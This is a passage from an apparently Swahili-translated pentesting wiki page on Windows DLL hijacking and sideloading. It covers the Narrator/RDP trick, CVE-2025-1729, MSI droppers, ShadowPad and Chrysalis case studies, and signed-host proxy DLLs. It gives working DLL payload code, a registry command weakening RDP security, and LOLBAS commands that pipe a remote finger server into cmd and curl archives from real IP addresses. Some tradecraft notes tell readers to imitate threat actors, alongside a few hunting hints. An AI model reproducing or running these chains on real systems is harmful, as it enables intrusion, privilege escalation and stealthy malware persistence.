- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwa host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuzindua Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji husimama wakati session ya RDP inapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kuclone built-in Accessibility Tool (AT) registry entry (mf., CursorIndicator), kisha uihariri ili ielekeze kwenye binary/DLL yoyote, uiimport, halafu weka `configuration` kuwa jina hilo la AT. Hii huproxy utekelezaji wowote chini ya framework ya Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha maadili ya HKLM kunahitaji admin rights.
- Mantiki yote ya payload inaweza kuishi ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinahitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), iliyofuatiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM chini ya context ya user aliyeingia.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, ikiruhusu local users kuacha files zozote.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka working directory yake kwanza na huweka log "NAME NOT FOUND" ikiwa haipo, ikionyesha local directory search precedence.

### Exploit Implementation

Attacker anaweza kuweka malicious `hostfxr.dll` stub kwenye directory hiyo hiyo, akitumia DLL inayokosekana kupata code execution chini ya context ya user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kama mtumiaji wa kawaida, dondosha `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshe saa 9:30 AM chini ya context ya mtumiaji wa sasa.
3. Ikiwa administrator ame-login wakati task inatekelezwa, malicious DLL huendeshwa ndani ya session ya administrator katika medium integrity.
4. Unganisha standard UAC bypass techniques ili kupandisha kutoka medium integrity hadi SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors mara nyingi huoanisha MSI-based droppers na DLL side-loading ili kutekeleza payloads chini ya trusted, signed process.

Muhtasari wa chain
- User hupakua MSI. CustomAction huendesha kimya kimya wakati wa GUI install (mfano, LaunchApplication au hatua ya VBScript), na kuunda upya stage inayofuata kutoka embedded resources.
- Dropper huandika legitimate, signed EXE na malicious DLL kwenye directory ileile (mfano jozi: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wakati signed EXE inapozinduliwa, Windows DLL search order hupakia wsc.dll kutoka working directory kwanza, ikitekeleza attacker code chini ya signed parent (ATT&CK T1574.001).

MSI analysis (cha kuangalia)
- CustomAction table:
- Tafuta entries zinazoendesha executables au VBScript. Mfano wa pattern ya kutia shaka: LaunchApplication ikitekeleza file iliyopachikwa nyuma ya pazia.
- Katika Orca (Microsoft Orca.exe), kagua CustomAction, InstallExecuteSequence na Binary tables.
- Embedded/split payloads ndani ya MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta vipande vingi vidogo vinavyounganishwa na decrypted na VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Dondosha faili hizi mbili kwenye folda moja:
- wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: attacker DLL. Kama hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na forward exports zinazohitajika kwenda kwenye genuine library huku ukitekeleza payload katika DllMain.
- Tengeneza minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia proxying framework (mfano DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia inaendesha payload yako.

- Technique hii inategemea DLL name resolution na host binary. Ikiwa host inatumia absolute paths au safe loading flags (mfano LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ilieleza jinsi Ink Dragon inavyotumia ShadowPad kupitia **three-file triad** ili kuchanganyika na software halali wakati core payload ikiwa bado encrypted kwenye disk:

1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature hubaki halali.
2. **Malicious loader DLL** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL kwa kawaida ni MFC binary iliyofichwa kwa ScatterBrain framework; kazi yake pekee ni kupata encrypted blob, kuidecrypt, na ku-reflectively map ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya memory-mapping decrypted payload, loader hufuta faili la TMP ili kuharibu forensic evidence.

Tradecraft notes:

* Kubadilisha jina la signed EXE (wakati unaweka `OriginalFileName` ya awali kwenye PE header) huiwezesha kujifanya Windows binary lakini ibaki na vendor signature, kwa hiyo iga tabia ya Ink Dragon ya kudondosha binaries zinazoonekana kama `conhost.exe` lakini kwa kweli ni AMD/NVIDIA utilities.
* Kwa kuwa executable inabaki trusted, controls nyingi za allowlisting zinahitaji tu malicious DLL yako iwe pembeni yake. Zingatia kubinafsisha loader DLL; signed parent kwa kawaida inaweza kuendeshwa bila kuguswa.
* ShadowPad decryptor inatarajia TMP blob iwe karibu na loader na iwe writable ili iweze kuzero file baada ya mapping. Weka directory writable hadi payload i-load; mara tu ikiwa memory, TMP file inaweza kufutwa kwa usalama kwa OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators huunganisha DLL sideloading na LOLBAS ili artifact pekee ya custom kwenye disk iwe malicious DLL iliyo karibu na trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell hu-spawn `cmd.exe /c`, huvuta commands kutoka Finger server, na kuzitia kwenye `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` huvuta TCP/79 text; `| cmd` hu-execute response ya server, ikiruhusu operators kubadili second stage upande wa server.

- **Built-in download/extract:** Pakua archive yenye benign extension, ifungue, na stage sideload target pamoja na DLL chini ya random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` huficha progress na kufuata redirects; `tar -xf` hutumia built-in tar ya Windows.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe CIM-created process wakati inapakia DLL iliyo pamoja nayo:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Hufanya kazi na binaries zinazopendelea local DLLs (mfano `intelbq.exe`, `nearby_share.exe`); payload (mfano Remcos) huendesha chini ya trusted name.

- **Hunting:** Toa alert kwenye `forfiles` wakati `/p`, `/m`, na `/c` zinaonekana pamoja; si kawaida nje ya admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi karibuni wa Lotus Blossom ulitumia vibaya trusted update chain kuwasilisha NSIS-packed dropper iliyostage DLL sideload pamoja na fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka kuwa **HIDDEN**, huacha Bitdefender Submission Wizard iliyopewa jina jipya `BluetoothService.exe`, malicious `log.dll`, na encrypted blob `BluetoothService`, kisha hu-launch EXE.
- Host EXE ina-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hufanya mmap-load ya blob; `LogWrite` huidecrypt kwa custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material inayotokana na hash ya awali), hu-overwrite buffer kwa plaintext shellcode, hufree temps, kisha hureruka kwenda kwake.
- Ili kuepuka IAT, loader huresolve APIs kwa hashing export names kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha dhidi ya salted target hashes.

Main shellcode (Chrysalis)
- Hudecrypt PE-like main module kwa kurudia add/XOR/sub na key `gQ2JR&9;` kwa passes tano, kisha dynamically hupakia `Kernel32.dll` → `GetProcAddress` ili kumaliza import resolution.
- Hujenga tena DLL name strings wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia second resolver inayopita **PEB → InMemoryOrderModuleList**, huchanganua kila export table katika 4-byte blocks kwa Murmur-style mixing, na hurudi kwenye `GetProcAddress` tu ikiwa hash haipatikani.

Embedded configuration & C2
- Config hukaa ndani ya faili la `BluetoothService` lililodondoshwa kwenye **offset 0x30808** (size **0x980**) na hudecryptiwa kwa RC4 na key `qwhvb^435h&*7`, ikifichua C2 URL na User-Agent.
- Beacons hujenga dot-delimited host profile, huongeza tag `4Q`, kisha hu-encrypt kwa RC4 na key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` juu ya HTTPS. Responses hu-decryptiwa kwa RC4 na kusambazwa na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode hufungwa na CLI args: no args = install persistence (service/Run key) ikielekeza kwa `-i`; `-i` hu-relaunch self na `-k`; `-k` huskip install na kuendesha payload.

Alternate loader observed
- Uvamizi huohuo ulidondosha Tiny C Compiler na kuendesha `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, ikiwa na `libtcc.dll` pembeni yake. C source iliyotolewa na attacker ilijumuisha shellcode, ika-compile, na ikaendeshwa in-memory bila kugusa disk kwa PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya compile-and-run inayotegemea TCC ili-import `Wininet.dll` wakati wa runtime na ikavuta second-stage shellcode kutoka URL iliyokuwa hardcoded, ikitoa loader yenye kubadilika ambayo hujifanya kama run ya compiler.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya DLL sideloading chains huongeza **stability engineering** ili host halali ibaki hai muda wa kutosha kupakia stages za baadaye kwa usafi badala ya ku-crash baada ya malicious DLL kupakiwa.

Muundo ulioonekana
- Dondoa trusted EXE pembeni ya malicious DLL kwa kutumia dependency name inayotarajiwa kama `version.dll`.
- Malicious DLL **hu-proxy kila expected export** kurudi kwenye real system DLL (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili import resolution iendelee kufanikiwa na host process iendelee kufanya kazi.
- Baada ya kupakiwa, malicious DLL **hu-patch host entry point** ili main thread ianguke kwenye infinite `Sleep` loop badala ya kutoka au kuendesha code paths ambazo zingekatisha process.
- New thread hufanya kazi halisi ya malicious: decrypting next-stage DLL name au path (RC4/XOR ni za kawaida), kisha kui-launch kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Normal DLL proxying huhifadhi API compatibility, lakini haihakikishi host itabaki hai muda wa kutosha kwa later stages.
- Kuweka main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka signed process resident wakati loader inafanya decryption, staging, au network bootstrap kwenye worker thread.
- Hunting tu kwa suspicious `DllMain` hukosa muundo huu ikiwa tabia ya kuvutia inatokea baada ya host entry point kupatched na secondary thread kuanza.

Minimal workflow
1. Nakili signed host EXE na tambua DLL inayoresolve kutoka local directory.
2. Tengeneza proxy DLL inayosafirisha functions zilezile na ku-forward kwenda kwenye legitimate DLL.
3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, tengeneza worker thread.
4. Kutoka kwenye thread hiyo, patch host entry point au main thread start routine ili i-loop kwenye `Sleep`.
5. Decrypt next-stage DLL name/config na iite `LoadLibrary` au manual-map payload.

Defensive pivots
- Signed processes zinazopakia `version.dll` au libraries zinazofanana sana kutoka kwenye application directory yao badala ya `System32`.
- Memory patches kwenye process entry point muda mfupi baada ya image load, hasa jumps/calls zinazoelekezwa kwenye `Sleep`/`SleepEx`.
- Threads zilizoundwa na proxy DLL ambazo mara moja huita `LoadLibrary` kwenye second DLL yenye jina lililodecryptiwa.
- Full-export proxy DLLs zilizowekwa pembeni ya vendor executables ndani ya writable staging directories kama `ProgramData`, `%TEMP%`, au unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
